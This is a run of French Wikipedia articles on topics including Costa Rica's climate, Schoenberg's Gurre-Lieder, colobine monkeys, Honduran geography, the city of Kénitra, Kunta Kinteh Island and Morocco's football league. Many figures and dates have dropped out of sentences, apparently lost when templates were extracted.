Le climat du Costa Rica est marqué par une saison sèche (décembre à avril) et une saison des pluies (mai à novembre). Le Costa Rica est situé dans la zone inter-tropicale (entre 8 et 11° de latitude nord). Toutefois, d'un endroit à un autre, les précipitations diffèrent considérablement : les précipitations à San José sont de par an, alors qu'à Puerto Limón sur la côte caraïbe, il tombe de pluie par an.

</doc>
<doc id="248651" url="https://fr.wikipedia.org/wiki?curid=248651" title="Gurre-Lieder">
Gurre-Lieder

Les Gurre-Lieder (ou Gurrelieder) sont une œuvre pour voix et orchestre d'Arnold Schönberg sur des textes de Jens Peter Jacobsen traduits en allemand par Robert Franz Arnold en 1899.
Il s'agit d'une composition de relative jeunesse malgré son ampleur, écrite peu après "La Nuit transfigurée", bien avant ses grandes œuvres dodécaphoniques et dont l'inspiration reste très post-romantique. Son écriture s'étend entre 1900 (année où il en conçoit la structure en trois parties pour cinq solistes, un récitant, trois chœurs d'hommes à 4 voix, un grand chœur à 8 voix et un très grand orchestre) et le avec Marya Freund (Tove), Hans Nachod (Valdemar), Anna Bahr-Mildenburg (Waldtaube) direction par Franz Schreker, date de sa création à Vienne. En fait, la première version de l'œuvre fut rapidement achevée, mais « oubliée » par le musicien, peut-être un peu impressionné par la taille de l'effectif nécessaire, mais aussi par le changement progressif de langage musical qu'il aborde peu après.
L'écriture de l'œuvre reprend le style harmonique très chromatique du "Tristan et Iseult" de Richard Wagner. La polyphonie, savante, utilise fréquemment le style en imitation. Le tout au service d'une musique expressive, de caractère post-romantique.
Alban Berg en fit une transcription partielle pour piano en 1907. Anton Webern en fit également une version pour huit mains et deux pianos en 1910.
Argument.
Le poème reprend l'histoire du roi Valdemar du Danemark (1131-1182) et de sa maîtresse, Tove, dans le château de Gurre. La première partie raconte leur rencontre et consiste en une alternance d'épisodes chantés par le roi et par l'amante, et séparés par des interludes orchestraux. L'héroïne est alors, dans la légende, assassinée dans un bain trop chaud par l'épouse légitime du roi. Elle se transforme en colombe et c'est le dernier chant de la première partie. On note à ce propos les allitérations Tove-Taube ("colombe", en allemand) ainsi que Gurre avec le roucoulement de cette dernière. La seconde partie, courte, est un chant de vengeance de Valdemar. La troisième et dernière partie, un peu plus courte que la première, raconte les imprécations du roi contre Dieu, et la vengeance de celui-ci condamnant le premier à une folle ronde éternelle dans la nuit.

</doc>
<doc id="248653" url="https://fr.wikipedia.org/wiki?curid=248653" title="Colobinae">
Colobinae

Les Colobinés (Colobinae), du grec kolobos ("") qui signifie « mutilé » constituent une sous-famille des mammifères primates appelés en français colobes, nasiques, entelles, semnopithèques, langurs, etc. La classification scientifique de ces singes est encore en évolution. 
Taxinomie et classification.
Liste des genres et sous-genres.
Selon la troisième édition de Mammal Species of the World de 2005 :

</doc>
<doc id="248654" url="https://fr.wikipedia.org/wiki?curid=248654" title="Colobus">
Colobus

Colobus (du grec kolobos ("κολοβος") qui signifie « mutilé ») constitue un genre de mammifères primates de la sous-famille des Colobinae. En français on les appelle, entre autres, colobes noir et blancs ou guérézas. Ils se distinguent par l'absence de pouce, d'où la qualification de "mutilé".
Liste des espèces.
Selon :
Il existerait aussi un hybride : "Colobus vellerosus x angolensis"
Systématique.
Le nom valide complet (avec auteur) de ce taxon est "Colobus" Illiger, 1811.
"Colobus" a pour synonymes :

</doc>
<doc id="248655" url="https://fr.wikipedia.org/wiki?curid=248655" title="Géographie du Honduras">
Géographie du Honduras

Le Honduras est un pays d'Amérique centrale. À la fois entouré par la mer des Caraïbes et l'océan Pacifique, le pays est situé à l'est du Guatemala, à l'est- nord-est du Salvador et au nord-nord-ouest du Nicaragua.
Le Honduras se trouve à 15° Nord et 86° Ouest. Sa superficie est de . Les frontières s'étendent sur kilomètres de longueur, 256 avec le Guatemala, 342 avec le Salvador et 922 avec le Nicaragua. Le Honduras possède de côtes.
Hydrologie.
De même que ses voisines d'Amérique centrale jusqu'au Yucatan mexicain, et les régions nord de l'Amérique du Sud jusqu'aux bouches de l'Amazone, le Honduras fait partie d'une des régions les plus arrosées de la planète (seulement dépassée par l'extrême sud-est de l'Asie).
D'après Aquastat, la hauteur d'eau annuelle moyenne des précipitations est de , soit pour une superficie de carrés, un volume de précipitations annuelles de cubes (soit près de 88 % du chiffre de l'Allemagne qui est de ).
De ce volume précipité, l'évapotranspiration et les infiltrations consomment une bonne soixantaine de pourcents, soit . Restent cubes de ressources d'eau superficielle produites annuellement sur le territoire du pays (en interne). De plus une quantité de cubes d'eau souterraine est produite chaque année, en interne également.
Les ressources totales en eau du pays s'élèvent donc ainsi à , toutes produites en interne (95 milliards 929 millions de mètres cubes), soit pour une population estimée à 8,5 millions d'habitants en 2008, environ d'eau par habitant, ce qui doit être considéré comme très satisfaisant et très largement suffisant.
Il faut ajouter qu'une modeste quantité d'eau quitte annuellement le territoire à destination de ses voisins : , et ce en direction du Guatemala par le rìo Motagua, et du Salvador via le río Lempa et le río Goascorán.

</doc>
<doc id="248658" url="https://fr.wikipedia.org/wiki?curid=248658" title="Kénitra">
Kénitra

Kénitra (en berbère : ⵇⵏⵉⵟⵔⴰ ; en arabe et en arabe marocain, à l'oral, "qni-tra", "petit pont") est une ville du Maroc. Pendant le protectorat français, la ville porte le nom de Port-Lyautey.
D'une superficie de , Kénitra est l’une des plus grandes villes marocaines reliant les villes du Nord à la capitale du pays. La ville se situe sur la rive sud de l’oued Sebou à de l’embouchure sur l’océan Atlantique vers Mehdia et à environ 35 km de Rabat.
Depuis les élections de septembre 2021, Anas Bouanani dirige la ville de Kénitra.
Histoire.
Antiquité.
L'histoire de la région remonte à l'époque romaine. De l'an 40 à l'an 280, la petite ville antique de Thamusida était située près de la ville actuelle de Kénitra à environ 23 km à vol d'oiseau, au nord de Mehdia, sur la rive gauche du fleuve Sebou. La ville était liée avec le monde romain (Italie) ou romanisé (Espagne méridionale).
Plusieurs historiens la lient étroitement à la kasbah de Mehdia, qui fut fréquentée par les Phéniciens et construite par Hannon au . Les Phéniciens fondèrent le comptoir de « Thymieterium » (ou Thymiaterion) à Mehdia au :
Le Périple du Pseudo-Scylax datant du ou du , cite le nom de Thymiateria, comme étant le port et la ville des Phéniciens.
Au de l'Hégire (), les écrivains arabes mentionnent une ville placée à l'embouchure du « "Wadi Sabu" » dénommée "Al-Ma'mura" (la peuplée, la florissante) ou "Halk" (l'embouchure) "Al-Ma'mura" ou encore "Halk Sabu". Au , les Banu Hilal s'installent dans les plaines atlantiques (Doukkala, Chaouia, Gharb), dans le centre-est (Al Haouz, Tadla) et en moindre mesure dans l'Oriental. Le calife Abu Yaqub Yusuf les subdivise en plusieurs parties et fait installer dans la région les Jochem, qui engendreront les Sofyan et les Khlot. Les Jochem cohabitent avec les Berbères&lt;ref name="tribusdumaroc.free.fr/safiane.php"&gt;tribusdumaroc.free.fr/safiane.php&lt;/ref&gt;.
Le 19 mai 1911, le Capitaine Petitjean est tué au cours d'un engagement à deux kilomètres de Kénitra. Son corps est ramené à la Kasbah de Kénitra, une citadelle située sur la rive gauche du fleuve Sebou et construite entre 1895-1896, sous le règne du Sultan Moulay Abd el Aziz.
L'historien français Daniel Rivet décrit dans son ouvrage l’architecture de la citadelle :
( pages 20–25).
Protectorat français.
La ville moderne de Kénitra est bâtie sur les instructions de Hubert Lyautey en 1912. La ville est dotée d'un plan directeur signé par Lyautey le 19 décembre 1914 ( page 26).
Son nom provient de l'arabe "Qnitra", « petit pont » ; il est tiré d'un ponceau construit sur l'oued Fouarat ou oued Souart en amont de la casbah. Ce ponceau «ali "et" addi"»" sera détruit en 1928, n'ayant plus d'utilité car l'oued avait été détourné. En 1932, la ville de Kénitra est renommée Port-Lyautey.
Seconde Guerre mondiale.
Le 8 novembre 1942, lors de la Seconde Guerre mondiale, durant l'opération "Torch", les troupes américaines débarquent en Afrique du Nord, Maroc et Algérie. Un débarquement a lieu à Mehdia, à l'embouchure du fleuve Sebou, près de Kénitra, l'objectif étant de s'emparer rapidement de la base d'aéronautique navale de Port-Lyautey mise en service en 1939 et de l'important nœud ferroviaire qui dessert l'Algérie. Après de durs combats près de la kasbah de Mehdia, un armistice est conclu pour l'ensemble des points de débarquement. L'amiral Darlan impose un cessez-le-feu le 11 novembre 1942 ( , 66-67 et 74). Les Américains établissent une base aérienne et des sous-marins, la "".
Une ville moderne.
Durant près de 24 ans, elle porte le nom de Port-Lyautey. En , lorsque le Maroc devient indépendant, la ville retrouve son nom d'origine, Kénitra.
De nombreux nouveaux projets industriels y voient le jour, comme la zone franche. Les immeubles ne dépassent pas les huit étages.
Kénitra est l’une des plus grandes villes marocaines et l’une des plus importantes du nord-ouest du Royaume. La ville se trouve sur la rive sud de l’oued Sebou à de l’embouchure sur l’océan Atlantique au niveau de Mehdia-plage. Elle se situe dans un carrefour de routes commerciales, reliant les villes du nord et de l’est du Maroc.
Politique et administration.
Gestion.
Le conseil communal de Kénitra aussi appelé conseil municipal se réunit obligatoirement 3 fois par an, lors de la première semaine des mois de février, mai et octobre. Il peut également se réunir : 
La présence des conseillers municipaux est obligatoire et ceux-ci sont informés de la date 10 jours avant.
Les séances du conseil sont ouvertes au publiques. Tout citoyen ou association a le droit de venir pour y assister.
Le président de la commune de Kénitra aussi appelé Maire de Kénitra :
Élections 2021.
Depuis les élections communales de 2021, le Maire de Kénitra est Anas El Bouanani, il a été destitué en septembre 2024 par la justice, suite à des irrégularités dans la délivrance d’autorisations de construction d’habitats.
Géographie.
Géologie et relief.
La région de Kenitra appartient au domaine le Rharb-Mamora. Le Rharb se trouve affecté d'une subsidence continue depuis le Vindobonien moyen (mise en place des nappes). Encore active de nos jours, cette subsidence est soulignée par un enfoncement de des égouts de la cité romaine de Banasa située au cœur de la plaine ; elle apparaît déjà nettement sur la carte du toit du Miocène.
Alors que s'effectue dans la mer tortonienne l'avancée des nappes prérifaines, la sédimentation se poursuit, déposant, jusqu'au début du Pliocène, une épaisse série marneuse pouvant atteindre de puissance dans la plaine, contre quelques centaines de mètres sur les bordures, conformément à l'ampleur de la subsidence dans le bassin. Cette série, dite des « marne sableuses », constitue le plancher imperméable des niveaux aquifères du Rharb ; tous les terrains antérieurs ne jouent pratiquement aucun rôle hydrogéologique.
Le cycle sédimentaire de l'ère tertiaire s'achève au Pliocène, caractérisé par des dépôts à caractères régressifs identifiés à l'affleurement sur les bordures du bassin : au Nord, ce sont des lumachelles et conglomérats, à l'Est, des sables jaunes, au Sud-Est des sables et grès coquillers. Divers sondages ont rencontré ces formations sous la plaine. Ces dépôts, en général peu épais, ne constituent qu'exceptionnellement l'objectif de recherches hydrogéologiques.À la fin du Pliocène, la mer n'occupe plus dans le Rharb qu'un golfe qui va sans cesse se rétrécir. Les premières transgressions marines quaternaires (Calabrien - Sicilien) n'intéresseront plus qu'une étroite bande ( au plus) parallèle à la côte actuelle ; les suivantes seront encore moins sensibles. Ces pulsations ont laissé des sédiments d'origine marine : calcaires gréseux, grès et sables qui sont datés à l'affleurement en quelques points privilégiés de la Mamora et qu'accompagnent d'anciens cordons dunaires apparaissant sous forme de sables souvent grésifiés.
L'ensemble de ces formations, localisé en zone côtière et dans une partie de la Mamora, peut atteindre d'épaisseur et constitue une zone d'infiltration et un réservoir aquifère de première importance.
À l'amont de cette zone d'influence marine s'accumulaient, au cours de la même période, des sédiments d'origine continentale, alternativement grossiers (galets- cailloutis) et fins (limons et argiles) selon la pluviosité des époques et la violence de l'érosion. En fait, dans le détail, la répartition de ces matériaux est capricieuse et varie rapidement dans le sens latéral. De gros efforts ont été déployés par les hydrogéologues pour identifier des repères et corréler ces niveaux à distance ; la plupart des procédés modernes de l'analyse sédiment logique : microfaunes, minéraux lourds, granulométrie, minéraux argileux ainsi que les procédés classiques de la corrélation : examen et conservation des déblais de forage, carottage mécanique, carottage électrique, ont été mis en œuvre sans apporter de résultats satisfaisants ; actuellement encore, c'est la seule comparaison subjective avec les affleurements les plus proches ou les sondages voisins qui guide les corrélations chronologiques.
On affecte habituellement :
Économie.
Capitale économique de la région historique du Gharb au nord-ouest du pays, Kénitra est considérée aujourd'hui comme l'une des principales villes marocaines. Elle est réputée entre autres pour son exportation de produits agricoles, et est souvent citée comme étant la capitale agricole du Maroc.
Atlantic Free Zone.
Kénitra accueille également Atlantic Free Zone, la plus grande zone franche d'exportation du continent africain (), située dans la banlieue de la ville ; elle héberge notamment une unité d'assemblage de Stellantis, la production de Peugeot 208 démarre en 2020.
Transports et infrastructures.
Protection des eaux potables.
Les effluents (eaux usées) de la ville ont fait l'objet d'un suivi scientifique de la part des chercheurs de l'Université Ibn Tofail, en vue d'alerter les autorités sur la menace sur les approvisionnements en eau potable (AEP).
Réseau ferroviaire.
Avec la gare de Kénitra-Ville, la capitale historique du Gharb est à trente minutes de Rabat et à une heure et demie de Casablanca par le TNR.
Par ailleurs, la ville est reliée par une Ligne à grande vitesse à Tanger au nord et à Casablanca au sud.
Réseau autoroutier.
Kénitra est longée par l'autoroute Tanger Med - Rabat qui la relie jusqu'à Agadir au Sud et à Tanger au Nord ainsi que Oujda vers l'oriental.
Le boulevard principal de la ville, nommé boulevard Mohammed-V, traverse la ville du nord (Direction Tanger) au sud (Direction Rabat) et est considéré comme le plus grand boulevard du continent africain, sa longueur dépasse ainsi les trente-quatre kilomètres.
Réseau fluvial.
Le port de Kénitra sur le Sebou, qui était considéré comme le commercial marocain et le et unique port fluvial, a cessé toute activité commerciale le 14 mai 2013 à la suite de la décision de l'Agence Nationale des Ports. Le port avait de facto arrêté son activité depuis huit mois avant cette décision, et est encore dans l'attente d'un arrêté définitif par le Ministère de l'Équipement et du Transport.
Le ministère de tutelle a par ailleurs lancé en 2012 le projet Kénitra Atlantique, dans le cadre de la stratégie nationale portuaire à l'horizon 2030, pour répondre aux besoins des importateurs et exportateurs de la région.
Sites naturels et loisirs.
Plages.
La station balnéaire de Mehdia et la plage Taxi Beach sont les plages les plus appréciées des vacanciers. Situées sur la côté Atlantique, ces plages sont prisées pour la pratique des sports nautiques en particulier le surf.
Transport.
La ville possède deux types de taxi : les petits, de couleur beige, pour les trajets à l'intérieur de la ville, et les grands, de couleur jaune, pour les trajets inter-cités Et centre-ville ; les petits coûtent plus cher que les grands, mais les grands peuvent véhiculer plus de passagers en même temps.
En janvier 2022, après avoir une vécu une grave crise de plus de deux années de ses transports , la ville réceptionne une flotte de 138 bus nouvelle génération et fabriqués au Maroc dont 89 à Kenitra. Les trajets que vont assurer ces nouveaux bus concernent 17 itinéraires urbains reliant cinq communes de la ville. Les nouveaux bus desserviront 577 stations, avec 28 millions de passagers annuellement.
Tourisme.
Bien que ne faisant pas partie des circuits touristiques Marocains classiques, la ville et ses alentours ne manquent pas de sites historiques ou consacrés à la biodiversité ou à des loisirs balnéaires :
Infrastructures hôtelières.
Kénitra possède une assez bonne infrastructure hôtelière ; on trouve un hôtel 5 étoiles et des hôtels 4 étoiles, et il y a des hôtels 3 étoiles, On y trouve également d'autres hôtels de moindre importance.
La plupart des hôtels remontent à l'époque du protectorat français. La ville n'a pas eu de vocation touristique avant les années 1970. Aujourd'hui, Kénitra accueille chaque année de plus en plus de touristes, bien que ce nombre ne soit pas très important. Environ touristes ont visité Kénitra en 2005.
Sports.
Aviron sportif.
Un club d'aviron fut créé en 1925, sous le nom de Club Nautique de Kénitra (CNK), par Monsieur Lemelle, qui en fut son .
Les présidents qui succédèrent à Monsieur Lemelle furent : Messieurs Jallat, Paray, Pierre Noël (jusqu'à son décès en 1982), Mortier, Baghdadi, et Monsieur Hikki qui est à ce jour président de l'U A K. Le club changea de nom, en fonction des changements de Nom de sa ville. Dans les années 1940, le club passât de Club Nautique de Kénitra (C N K), à, Club Athlétique Port-Lyautéen (CAP), en 1956, La ville de Port-Lyautey reprenant son nom d'origine : Kénitra, le Club devint l'Union Athlétique de Kénitra (UAK). Les sportifs de ce club se sont illustrés pendant de nombreuses années.En effet le club peut s’enorgueillir de plusieurs places de finalistes aux Championnats de France d'aviron. Et surtout,
C’était une époque où seules les premières places comptaient, et, où l’éloignement des plans d'eau de championnats, hors du Maroc, avait pour conséquence une organisation logistique qui frôlait l'aventure, lorsqu'une équipe sélectionnée, voulait y participer. Ce qui ne serait plus le cas de nos jours
La liste des titres de Champions du Maroc, acquis par le Club, serait trop longue pour être dans cette synthèse de l'activité du Club. Les championnats du Maroc furent très souvent organisés sur l'oued Sebou, puis à partir des années 1960 systématiquement organisés sur le lac de Mehdia.
Dans les années 1930, 40, et début 50 le plan d'eau de l'oued Sebou servait d'étape aux hydravions de l'aéropostale.
L'hydravion de Mermoz s'y est souvent posé.
Une trace de ce sport est mentionnée dans la courbe de l'oued Sebou comme étant l'anse de l’aviron; il ne s'agit pas des sympathiques "floucas" à rames des pêcheurs d'aloses qui campaient face au port mais bel et bien d'aviron sportif moderne.
Football.
Le KAC de Kénitra est l'un des grands clubs marocains. Il a gagné 4 titres de champion du Maroc et une coupe du Trône. Il évolue actuellement en deuxième division.
En 2007, le KAC a réussi sa montée en Division, grâce à sa dans le championnat de Division.
La ville dispose du stade municipal, d'environ places. Il a été inauguré en 1916, actuellement en rénovation. C'est le premier stade de football construit sur le sol du royaume du Maroc, et il accueille les matchs du KAC, ainsi que ceux de la Renaissance de Kénitra, le de la ville, qui évolue actuellement en championnat amateur.
Futsal.
Le Dina Kénitra Futsal Club évolue en championnat du Maroc de futsal.
Basket-ball.
La section Basket-ball du KAC de Kénitra a remporté la Coupe du trône en 1984.
La municipalité dispose de la Salle Al Wahda qui est une salle couverte omnisports d'une capacité de places. Elle accueille chaque année plusieurs manifestations sportives.
Handball.
La ville dispose de deux clubs de handball :
Cyclisme.
CYCLISME AUTREFOIS (Années 1950) A Kénitra = http://www.aakppa.org/articles.php?lng=fr&amp;pg=4212
Surf.
Mehdia est le berceau du surf au Maroc. De nombreux spots y sont praticables tout au long de l'année avec des périodes de grosse houle pour les surfeurs confirmés (Spots de Sharatane, Moune, Chlihat) ou des périodes calmes, en été, propices aux débutants. (Consulter par exemple www.mehdiasurf.com).

</doc>
<doc id="248661" url="https://fr.wikipedia.org/wiki?curid=248661" title="Port-Lyautey">
Port-Lyautey



</doc>
<doc id="248664" url="https://fr.wikipedia.org/wiki?curid=248664" title="Liste des résultats des élections présidentielles américaines">
Liste des résultats des élections présidentielles américaines

À chaque élection présidentielle, dans chaque État des États-Unis, des grands électeurs sont nommés en fonction du résultat au suffrage universel. Ces grands électeurs, qui forment le Collège électoral des États-Unis d'Amérique, votent ensuite pour le président des États-Unis. Dans la plupart des États, le candidat à la présidentielle qui obtient le plus de voix remporte la totalité des grands électeurs de l'État. Cependant, dans certains États, tout ou partie des grands électeurs peut être réparti de façon proportionnelle : par exemple, dans le Maine en 2016, Clinton a obtenu 47,9 % et Trump 45,2 %, la première remportant ainsi 3 grands électeurs contre 1 pour le second candidat. Si le vote du Collège électoral ne parvient pas à dégager un candidat majoritaire, l'élection est décidée par la Chambre des représentants.
Résultats par État.
Les tableaux ci-dessous indiquent pour chaque État le parti du candidat le plus voté par les grands électeurs (voir code couleurs ci-dessous), ainsi que le nombre total de délégués fournis. 
NB : tous les délégués de l'État ne votent pas forcément pour le candidat majoritaire.

</doc>
<doc id="248667" url="https://fr.wikipedia.org/wiki?curid=248667" title="Luvsangiyn Erdenechuluun">
Luvsangiyn Erdenechuluun

Luvsangiyn Erdenechuluun (), né le à Oulan-Bator, est un homme politique mongol, ministre des Affaires étrangères d'août 2000 jusqu'en septembre 2004. 
Biographie.
Luvsangiyn Erdenechuluun est membre du "Parti révolutionnaire du peuple mongol", l'ancien parti unique et communiste devenu social-démocrate.
D'août 2000 à septembre 2004, Luvsangiyn Erdenechuluun exerce la fonction de ministre des Affaires étrangères. En 2000 et en 2002, il représente son pays à l'Assemblée générale des Nations-unies.
Les élections législatives du sont une déroute pour le "PRPM" et Erdenechuluun perd son poste ministériel. En 2005, il fonde la "Human Security Research Center" destinée à enquêter sur la traite des êtres humains.
Luvsangiyn Erdenechuluun est le fils de Sonomyn Luvsan, un homme politique mongol.

</doc>
<doc id="248672" url="https://fr.wikipedia.org/wiki?curid=248672" title="Île Kunta Kinteh">
Île Kunta Kinteh

L'île Kunta Kinteh, appelée île James jusqu’en 2011, est une petite île située sur le fleuve Gambie, à 30 kilomètres de l'embouchure du fleuve et proche de Juffureh. Elle fut un important comptoir ouest-africain pour le commerce des esclaves. Elle est inscrite sur la liste du patrimoine mondial de l'UNESCO.
Géographie.
L'île Kunta Kinteh est une petite île située dans le fleuve Gambie. Sa position stratégique au milieu du fleuve lui offre la possibilité de contrôler la voie navigable.
L'île comprend les patrimoines historique suivant qui sont en ruine : la maison des esclaves, la cuisine du gouverneur, la forge et un magasin. 
D'autres ruines du colonialisme et de l'esclavage sont encore présentes sur cette île. Beaucoup de canons s'y trouvent toujours, de même que les prisons où étaient emprisonnés les esclaves avant leur expédition en Amérique. Des traces de fortifications et accessoires de bâtiment de service survivraient toujours à chaque extrémité de l'île ainsi que sur la rive Sud. 
Le fort, de plan carré avec des bastions polygonaux aux quatre coins, situé au milieu de l'île subit les inondations et les marées.
Historique.
D'après les anciens cercles de pierre et monticules funéraires (mbanar) trouvés sur la région du fleuve Gambie, elle serait habitée depuis longtemps. Cette région demeura pendant une période sous l'hégémonie du royaume du Kaabu qui joua un rôle primordial dans le commerce triangulaire.
Les îles sur le fleuve Gambie, Juffureh, l'île proche de Banjul avec le Fort Bayona et l'île Kunta Kinteh abritaient les premiers marchands européens issus de Courlande (en Lettonie actuelle) du au . Ils l'appelèrent île Saint-André. À partir de 1651 et jusqu'à ce que les Anglais s'en emparent en 1661. L'île fut un comptoir d'esclaves du commerce triangulaire en liaison notamment avec l'île courlandaise de Tobago située aux Antilles.
Ce sont les Anglais qui la nommèrent James. L'île est ensuite employée pour le commerce de l'ivoire et de l'or, puis à nouveau pour le commerce d'esclaves. Fin juillet 1695, le fort James est pris par les Français pendant l'expédition de Jean-Baptiste de Gennes vers le détroit de Magellan et renommé fort Saint-Jacques par les Françaisqui possédaient un comptoir à Albreda. Les Anglais récupérèrent le fort définitivement en 1702, qui fut abandonné en 1779 avec l'arrêt de l'esclavagisme par les Britanniques.
L'île Kunta Kinteh fut pendant longtemps un lieu que les pêcheurs, surnommés "Niuminkas", considéraient comme un héritage sacré.
Tourisme.
L’île Kunta Kinteh se dévoile en remontant le fleuve Gambie à l’intérieur des terres. Elle a joué un rôle crucial durant le commerce triangulaire et la colonisation. En effet, sa position de carrefour permettait aux colons européens de pénétrer le continent africain et de faciliter le trafic pré-colonial. Ainsi, elle fut un important comptoir ouest-africain du commerce triangulaire. Ce patrimoine historique classé comme mondial selon l’UNESCO en 2003 fut l’une des premières voies d’entrée de l’Afrique par les Occidentaux grâce à sa position d’interface. Sa portée historique séduit davantage les étrangers et développe le tourisme. En plus, l’île Kunta Kinteh abrite de grands patrimoines historiques, à savoir, le Fort. En outre, se dressant fièrement sur l’île, ce dernier, construit en 1651, conserve des souvenirs liés à la diaspora africaine. À part le fort, cet îlot présente d’autres sites historiques comme le Fort de Bullen, le bâtiment de la CFAO, la chapelle portugaise de Juffureh, les ruines de San Domingo et la batterie de 6 canons à Banjul. 
Cette petite île est accessible depuis les abords du fleuve grâce aux bateaux de croisière pouvant accueillir une visite touristique aux alentours.

</doc>
<doc id="248675" url="https://fr.wikipedia.org/wiki?curid=248675" title="Championnat du Maroc de football">
Championnat du Maroc de football

Le Championnat du Maroc de football, appelé « Botola Pro » (ou « Botola Pro Inwi » pour des raisons de parrainage avec Inwi), est le championnat professionnel de plus haut niveau du football marocain.
La compétition actuelle est créée en 1956 à la suite de l'indépendance du Maroc. Le championnat est organisé par la Ligue nationale de football professionnel, sous l’égide de la Fédération royale marocaine de football, fondée en janvier 1957 peu après le début du premier championnat.
Auparavant, d'autres championnats ont eu lieu sous la période du protectorat français. Un premier championnat est créé en 1915 sous l'égide de l'USFSA, puis un deuxième à partir de 1922, organisé par la Ligue du Maroc de Football Association, sous l'égide de la Fédération française de football.
La Botola Pro se déroule annuellement selon un format aller-retour comprenant 30 journées, généralement entre l’été et le printemps suivant. Seize clubs y participent chaque saison.
Le Wydad AC détient le record du plus grand nombre de titres remportés avec 22 titres, comptant les titres obtenus avant l'indépendance. La RS Berkane est le club champion en titre.
Histoire.
 dont la "Ligue du Maroc de Football Association" ("LMFA") fut la dernière, et qui s'est institué le à Casablanca, lors d'une assemblée générale constitutive. Elle a pris donc la conduite d'organe footballistique sous la "Fédération marocaine des sports athlétiques" ("FMSA"), fédération sportive créée en 1913 d'après le dahir chérifien du en remplacent le "Comité Régional de Football" d"Union des Sociétés et Fédérations des Sports Athlétiques" ("USFSA") pour la gestion du football. Une deuxième assemblée avait lieu le , toujours à Casablanca, en présence des clubs affiliés au "Comité Régional de Football d'USFSA"; sont représentés les vingt clubs affiliés régulièrement ainsi que trois clubs en instance d'affiliation à la "FIFA". Lors de cette assemblée, le siège est fixé à Casablanca. Le Bureau fédéral de la F.I.F.A. homologue les statuts de la "LMFA" le , et déclare en conséquence la ligue marocaine de football association régulièrement instituée.
Le Club Athlétique de Casablanca ("CA de Casablanca") fut le premier club marocain à avoir remporté le titre de champion du Maroc de la division d'excellence lors de la édition de la compétition ("saison 1915/16"), avec l'US Marocaine comme dauphin, le Rabat FC comme troisième et le Racing AC comme quatrième dont le classement final est le suivant :
Les trois saisons suivantes ont vu le sacre de l'US Marocaine en trois reprises d'affilée (1916/1917, 1917/1918 et 1918/1919). Il a fallu donc attendre jusqu'à l'édition numéro cinq de l'histoire du championnat marocain de football (division d'excellence) pour voir le sacre d'un club non-casablancais, l'USD Meknès, qui a remporté son premier titre de champion du Maroc.
Juin 1938, l'assemblée générale de la LMFA s'est tenue samedi soir à Rabat... Après une longue et orageuse discussion, l'assemblée a décidé de porter à dix le nombre des clubs composant la division d'honneur.
Après l’indépendance du nord marocain (pas tout le nord), le comité provisoire de la "FRMF" a décidé d'organiser la Coupe de l'Indépendance qui réunit les clubs du Maroc et les clubs fondés par les Marocains en nord que soit avant ou bien après l'indépendance pour dans les différentes divisions pour la nouvelle saison du championnat. Les meilleures équipes de cette compétition (qui sont pas parmi l'élite) joueront ainsi en division (système des matchs barrages). En 1957, le championnat du Maroc était composé de 16 clubs, et il est revenu à 14 équipes lors de la saison 1958-1959, structure qu'il gardera jusqu'à la saison 1966-1967 où il repasse de nouveau à 16 clubs, puis 18 clubs la saison suivante, avant de revenir à une formule à 16 en 1968-1969. Cette dernière formule perdura durant toute la décennie 1970, avant que le nombre ne passe à 20 à l'aube de la saison 1980-1981, puis ramené à 18 la saison suivante et 16 clubs la saison d'après.
Lors de la saison 1985-1986, le nombre est augmenté à 20 clubs de nouveau. La saison suivante 1986-1987 connaîtra la mise en place d'une formule inédite comprenant deux groupes de 12 clubs chacun, les quatre premiers de chaque groupe sont qualifiés aux play-offs qui se disputent en mini-championnat.
En 1987-1988, le championnat est ramené à 18 clubs à poule unique, puis à 16 clubs en 1988-1989. Depuis cette saison, le nombre de clubs en division d'élite ne connaîtra plus de changement.
À la fin de la saison 1996-1997, un nouveel organe de football est créé sous le nom de Groupement national de football ("GNF"), qui deviendra l'organisme responsable des deux premières divisions d'élite de football au Maroc, et qui porteront depuis les noms de "GNF1" et "GNF2".
En 2007-2008, la Botola fait un grand pas vers le professionnalisme en profitant de l'augmentation des droits TV grâce à des nouveaux contrats conclus avec la SNRT et ART, ainsi que des recettes de sponsoring. La première division est désignée depuis cette saison par le nom de « Botola Pro », qui signifie « Championnat » en arabe.
En 2009, le GNF est dissous et la Botola est gérée depuis directement par la FRMF jusqu'en 2015 et la création de la Ligue Nationale de Football Professionnel ("LNFP").
Le 28 janvier 2011, le président de la commission spéciale de gestion des compétitions du football national d'élite Rachid Ouali, annonce la professionnalisation du championnat dès la saison à venir. Ce processus a déjà commencé en 2000 avec l'étude et l'adoption du dossier par les instances de la FRMF. Il s'est ensuivi la création du Groupement national de football d'Élite (GNFE) avec 16 équipes en première division et autant en deuxième. La professionnalisation du football marocain avec la naissance d'un contrat liant le joueur à son club devait entrer en vigueur dès le début de la saison 2005-2006. D'autres mesures furent engagées en même temps, toutes destinées à poursuivre le processus de professionnalisation de ce sport, surtout que le contrat-programme de mise à niveau du football marocain, signé le 7 juin 2005 entre le gouvernement, les collectivités locales et la FRMF, avait décidé d'une contribution étatique d'un montant de 280 millions de dirhams. La FRMF a rouvert le chantier en 2009 par le biais d'un programme visant le financement, la modernisation de la gouvernance, la mise à niveau des textes et règlements et la restructuration du football d'élite.
Le , au titre de la rencontre opposant le Fath Union Sport et l'IR Tanger comptant pour la journée, l'assistance vidéo à l'arbitrage 'VAR' est utilisé pour la première fois au Maroc. L'utilisation du VAR devait commencer en début de saison, avant d'être reportée à la phase retour, dans le but de permettre à la FRMF de former les arbitres et d'obtenir les licences d'arbitrage par vidéo. Le 2020, la FRMF annonce que la VAR sera dotée de la ligne de hors-jeu virtuelle. Elle sera appliquée pour la première fois lors de la journée.
Le , Abdessalam Belegchour, vice-président de la LNFP, a annoncé que la FRMF s'est engagée avec une société étrangère, chargée de la programmation des championnats espagnol et anglais de première division, pour la programmation de la Botola Pro, et ce afin de faciliter le bon déroulement du championnat national.
Structure du championnat.
La division d'élite est composée de 16 clubs, à la fin de chaque saison, le club champion et le vice-champion sont qualifiés pour la Ligue des champions de la CAF et celui classé à la se qualifie pour la Coupe de la confédération avec le vainqueur de la Coupe du Trône. Tandis que les 2 derniers du classement sont relégués en Botola Pro2.
Palmarès.
Bilan par club.
Le tableau suivant liste les clubs vainqueurs du championnat du Maroc avant et après l'indépendance et, pour chaque club, le nombre de titre(s) remporté(s) et les années correspondantes par ordre chronologique.
Statistiques.
Classement des meilleurs buteurs.
Ce classement montre les meilleurs buteurs de Botola Pro depuis 2011, date à laquelle le championnat est devenu professionnel. Les joueurs mentionnés en gras évoluent toujours dans le championnat.
